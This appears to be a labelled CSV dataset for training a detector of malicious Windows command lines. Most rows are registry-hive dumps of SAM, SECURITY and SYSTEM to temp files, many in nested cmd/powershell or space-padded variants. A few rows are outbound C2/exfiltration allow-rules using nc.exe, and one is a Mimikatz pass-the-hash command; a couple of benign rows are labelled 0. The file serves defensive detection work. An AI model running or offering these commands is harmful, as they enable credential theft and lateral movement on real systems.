text,label
reg export hklm\sam c:\windows\temp\f5tslqxr.save,1
reg export hklm\system c:\windows\temp\dpjl0f55.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\wekl9kti.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\imsulhoy.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\jbo0ca6y.dat""",1
reg export hklm\sam c:\windows\temp\mp6txhb2.save,1
reg save hklm\security c:\windows\temp\nkubfymw.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\9gcsnjw1.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\pvmgr78c.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\39po3w74.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\q1m0hbso.save""",1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""reg save hklm\security c:\temp\iibmts94.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\jekaclg9.dat""""",1
reg export hklm\security c:\windows\temp\j70q6c1v.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\src2xmxs.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\slxihntu.dat""",1
reg save hklm\sam c:\windows\temp\mfyq90sy.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bi9flea7.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rai5dp5d.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\4z72tqqt.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ie1fduk5.dat""",1
reg save hklm\sam c:\windows\temp\jcwhlk1d.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\gnqtje3c.dat""""",1
reg export hklm\system c:\windows\temp\svgl3f5t.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\mo9h5tvh.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\mn1a84bq.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\pvxgs9bj.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ud4gq9nz.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\25k6vqj7.dat""",1
reg save hklm\sam c:\windows\temp\cxaozmm2.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\c3oxl9hf.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\wponxhp3.dat""",1
reg save hklm\sam c:\windows\temp\3cjpm1c6.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\s3cssu7u.save""",1
reg export hklm\security c:\windows\temp\rm3qdykm.save,1
reg save hklm\system c:\windows\temp\4malk6d3.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ad91dv4g.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\xumsfqs9.dat""",1
reg export hklm\security c:\windows\temp\0sn23kff.save,1
reg  export  hklm\security  c:\windows\temp\7vxavscj.save,1
reg save hklm\system c:\windows\temp\kwepo5ys.save,1
reg   save   hklm\security   c:\windows\temp\iur0tztp.save,1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\81e3ifme.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\k25nvn58.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\yyli2wnr.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\jb6u7xie.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0hbxwzkc.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\9baqay7n.dat""",1
reg export hklm\system c:\windows\temp\lrzs4qvg.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\5c848b6l.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\2rgkw2v5.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\49cq96sz.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\sv1hyees.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\q1fc1ut7.dat""""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\s6yzj5fj.dat""""",1
reg export hklm\system c:\windows\temp\v1x9ygnp.save,1
reg save hklm\system c:\windows\temp\jwh861lk.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\liiir03v.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ua6gnk28.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\hcj5i5d0.dat""",1
reg save hklm\sam c:\windows\temp\qsu8tvpd.save,1
reg save hklm\system c:\windows\temp\cjucqq3c.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ziz4m8bz.dat""",1
reg export hklm\security c:\windows\temp\uuiyg6s9.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\xs9kei2s.save""",1
reg  save  hklm\system  c:\windows\temp\ynkigonc.save,1
reg save hklm\system c:\windows\temp\nnsep4p4.save,1
reg   export   hklm\sam   c:\windows\temp\nmocavfu.save,1
reg  save  hklm\security  c:\windows\temp\4ktrmpmy.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\rzc625hq.dat""",1
reg save hklm\security c:\windows\temp\mrzotyov.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\84ipb4yo.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\207hgusc.dat""",1
reg export hklm\security c:\windows\temp\4frimmb3.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\2kgcajh2.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\yya3zvaw.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\cs0r2xqg.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\zer71nzh.dat""",1
reg export hklm\sam c:\windows\temp\fi1w1cbz.save,1
reg export hklm\security c:\windows\temp\09m7agfq.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\udf3y9vb.dat""",1
reg export hklm\sam c:\windows\temp\vnkiu25g.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\8u7fts2n.dat""",1
reg export hklm\system c:\windows\temp\6ift5eei.save,1
reg export hklm\sam c:\windows\temp\ghrejik0.save,1
reg export hklm\security c:\windows\temp\vesa8sia.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\7k7geum9.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\693iklve.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\itilwttl.dat""",1
reg save hklm\system c:\windows\temp\radc2r79.save,1
reg export hklm\security c:\windows\temp\i5mvt2u3.save,1
reg export hklm\system c:\windows\temp\u6njcec0.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\25vhe552.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\7m5iqzbt.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\po80agox.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\za3s0ouu.dat""",1
reg export hklm\sam c:\windows\temp\1slamni3.save,1
reg save hklm\sam c:\windows\temp\qd8wntf1.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\orqelmn3.dat""",1
reg export hklm\sam c:\windows\temp\a8qlu0u4.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\wkok0ak6.dat""",1
reg export hklm\system c:\windows\temp\hp6qbkkv.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\6drio462.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\cxcn2soa.dat""",1
reg save hklm\sam c:\windows\temp\zjebyz9b.save,1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\7tsu40mz.save""",1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\zrljgo12.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\95bo54t1.dat""",1
reg save hklm\security c:\windows\temp\9vgy78wu.save,1
reg export hklm\sam c:\windows\temp\2r8ynei0.save,1
reg export hklm\sam c:\windows\temp\prsfevd8.save,1
reg export hklm\system c:\windows\temp\878cvhmy.save,1
reg save hklm\system c:\windows\temp\hrst1d3c.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\g3vxwi44.dat""",1
reg save hklm\system c:\windows\temp\i0wy7j76.save,1
reg export hklm\security c:\windows\temp\t2lmkvgc.save,1
"powershell -nop -c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\4ou3vgv1.dat""",1
reg save hklm\security c:\windows\temp\gizp95qe.save,1
reg save hklm\sam c:\windows\temp\pgv15x4v.save,1
reg save hklm\security c:\windows\temp\1vmsri84.save,1
reg save hklm\sam c:\windows\temp\buocakpg.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\jdn7c3g5.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\jzy0bq44.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\yj2sokpb.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\g3b7yaqn.dat""",1
reg export hklm\sam c:\windows\temp\x2f0dgh7.save,1
reg export hklm\system c:\windows\temp\dfkk7qa1.save,1
reg   export   hklm\sam   c:\windows\temp\7pkeh9z6.save,1
reg export hklm\security c:\windows\temp\9nmaj3dy.save,1
reg save hklm\system c:\windows\temp\lskkdott.save,1
reg save hklm\sam c:\windows\temp\rdf6d0l7.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\0xld7umo.dat""",1
reg export hklm\sam c:\windows\temp\3pltwu5q.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\8xzsxxx4.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\dtc7g8p4.dat""",1
reg export hklm\system c:\windows\temp\3cy4k4wb.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\fr8y4erj.dat""",1
reg save hklm\sam c:\windows\temp\8gagz65e.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\i800a1yz.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\x1pahgbd.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\sg6ytp47.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\hdjaxszo.dat""",1
reg export hklm\sam c:\windows\temp\gfs36s47.save,1
reg   export   hklm\sam   c:\windows\temp\yql83boa.save,1
reg export hklm\system c:\windows\temp\ed3nnaqg.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\aonn289h.dat""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\635wnqsc.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\11xwblzh.dat""",1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\tjr2yudt.save""",1
reg export hklm\system c:\windows\temp\9vnqn3m3.save,1
reg save hklm\system c:\windows\temp\b7mvk0yu.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\3okkaj1g.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\p5nfbp6q.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\j6zrzc4s.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\hdfk2ijo.dat""",1
reg export hklm\system c:\windows\temp\o7ktq6uq.save,1
reg export hklm\system c:\windows\temp\9dtrfk41.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\257fifz1.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\uyf9yf6g.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\uw68nczu.dat""",1
reg export hklm\security c:\windows\temp\28l1izm2.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\95ysr1mu.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\4ony6iej.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\9m6a7bpq.dat""",1
reg save hklm\security c:\windows\temp\ykc3ptt1.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\jl66oat6.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\sl08mbra.dat""",1
reg save hklm\security c:\windows\temp\sy5s81pn.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\hiezlcxu.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\mgzkkqcp.save""",1
reg save hklm\security c:\windows\temp\w663kj65.save,1
reg export hklm\sam c:\windows\temp\fvqjacd1.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\sam c:\windows\temp\60d3e308.save,1
sekurlsa::pth,3
"cmd.exe /c ""reg save hklm\sam c:\temp\labc4b86.dat""",1
reg export hklm\security c:\windows\temp\64p2k5ku.save,1
reg save hklm\system c:\windows\temp\kzhjij4c.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\avpkk8kg.dat""",1
reg save hklm\system c:\windows\temp\jkhf2g0v.save,1
reg save hklm\system c:\windows\temp\ihrm910s.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\0laax1u4.dat""",1
reg save hklm\system c:\windows\temp\rsjhvhqy.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\r78c68zk.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ooigxtvf.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\e65l732u.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\dkwsueps.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\rphf0ybx.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\edes39ku.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\68z0ez4q.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\lb84xr0v.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\9uf2dwnd.dat""",1
reg export hklm\system c:\windows\temp\c977f7g6.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\1oem8nqu.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\d4zpbb9p.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\y6pim0uw.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\jbvph0kl.dat""",1
reg save hklm\system c:\windows\temp\e63bb1bv.save,1
reg save hklm\sam c:\windows\temp\kvls4eh0.save,1
reg save hklm\sam c:\windows\temp\42rr8e5p.save,1
reg save hklm\sam c:\windows\temp\azmk3v0y.save,1
reg save hklm\security c:\windows\temp\975mytfc.save,1
reg save hklm\system c:\windows\temp\oi27bx1w.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ldepsj0p.dat""",1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\ab091rsb.save""",1
reg  save  hklm\sam  c:\windows\temp\ub04k87p.save,1
reg export hklm\system c:\windows\temp\acpmuvmp.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\gnjgndci.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\gjnsh3sy.dat""""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\0t12zy28.dat""""",1
reg export hklm\security c:\windows\temp\n8fodqkn.save,1
reg export hklm\sam c:\windows\temp\s0tgbf5l.save,1
reg save hklm\security c:\windows\temp\n1fih3q0.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\5pzd61jo.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\hz5zkpon.dat""""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\a3trkxvj.dat""""",1
reg export hklm\security c:\windows\temp\t0t54ugj.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\00cr9nwj.dat""",1
reg export hklm\system c:\windows\temp\wnz67psj.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\x2exoy4h.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\gsk5m8oy.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\llr4vpwb.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\exbmodrl.dat""",1
reg  save  hklm\system  c:\windows\temp\p401ggoc.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ad0cqjau.dat""",1
reg export hklm\system c:\windows\temp\nnik3ier.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\rtcisjxj.dat""",1
reg save hklm\security c:\windows\temp\t0x1uvmm.save,1
reg export hklm\security c:\windows\temp\9t7j3530.save,1
reg export hklm\security c:\windows\temp\bp5y7g3o.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\xpdigcyj.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\q0vainvk.dat""""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\aiya5cv7.dat""""",1
reg export hklm\security c:\windows\temp\bkypml3h.save,1
reg save hklm\security c:\windows\temp\xxndwuxd.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\q7e3fwk4.dat""",1
select-string  -path  c:\logs\app.log  -pattern  'failed  logon',0
reg export hklm\security c:\windows\temp\abb870r1.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\b7u8yzfe.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\6revokab.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\kbo7xoxn.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\wet1x72t.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\fvnbztdm.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\26pb3ghv.dat""",1
reg  export  hklm\security  c:\windows\temp\ymuy91ts.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\x2j679k1.dat""",1
reg save hklm\security c:\windows\temp\lk8lt7jd.save,1
reg save hklm\security c:\windows\temp\rgpx04us.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\naj5gsaa.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\94p62u9j.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2lqusq78.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\9s0r18na.dat""",1
reg export hklm\system c:\windows\temp\knnktwkn.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\u8lmcvyn.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\hnmp26s9.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\icbvxw76.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\hu9kgv0q.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\5uloups3.dat""",1
reg export hklm\sam c:\windows\temp\egrinrhf.save,1
reg export hklm\security c:\windows\temp\pz6ik1y5.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\w1k66aga.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\0w3owzx9.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\3gui5r91.dat""",1
reg export hklm\system c:\windows\temp\jv0lguwt.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\518jwd5k.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\d2m6zca4.dat""""",1
reg save hklm\sam c:\windows\temp\s4a7chx1.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ahfx8xn1.dat""",1
reg export hklm\sam c:\windows\temp\6lwge6y6.save,1
reg export hklm\security c:\windows\temp\wjgk7y7g.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ngdn0q4l.dat""",1
reg export hklm\security c:\windows\temp\z0aedyzm.save,1
reg export hklm\system c:\windows\temp\7potyxw5.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\g75q6rnf.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\owy05ncf.dat""",1
reg save hklm\system c:\windows\temp\j7lfke0u.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\a2s4dsuk.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\fm5kxw5x.dat""",1
reg save hklm\sam c:\windows\temp\1eg9ny60.save,1
reg save hklm\system c:\windows\temp\lwr74w26.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\mejzfmtx.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hk5vr4up.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\u1ta72eg.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\bkyg5osg.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2wct17zs.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\jkxex8vt.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\l3ubiu10.dat""",1
reg export hklm\security c:\windows\temp\i1sptcu6.save,1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\im9dimfv.save""",1
reg export hklm\sam c:\windows\temp\voupqam5.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\hio3zxmp.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ioevmhhj.dat""",1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\ne4elvx4.save""",1
reg export hklm\system c:\windows\temp\cfbr6wgd.save,1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\4n7rsbp7.dat""",1
"powershell -nop -c ""sc query windefend""",0
"cmd.exe /c ""reg save hklm\security c:\temp\kfe7j914.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\sam c:\temp\adwpemxz.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\hftn2npn.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\r7m2p675.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\uq053pg8.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\e2dk9jxd.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\7vm6s1x2.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\vvxzik50.dat""",1
reg save hklm\system c:\windows\temp\anibxe1c.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\m9khzbaz.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\xip0hn00.dat""",1
reg save hklm\system c:\windows\temp\8x650250.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\5btuh7kf.dat""",1
reg export hklm\system c:\windows\temp\08y695p4.save,1
reg export hklm\system c:\windows\temp\ega6kl49.save,1
reg export hklm\system c:\windows\temp\h30dlgy8.save,1
reg save hklm\security c:\windows\temp\c5m4u7dp.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\v95j59e1.dat""",1
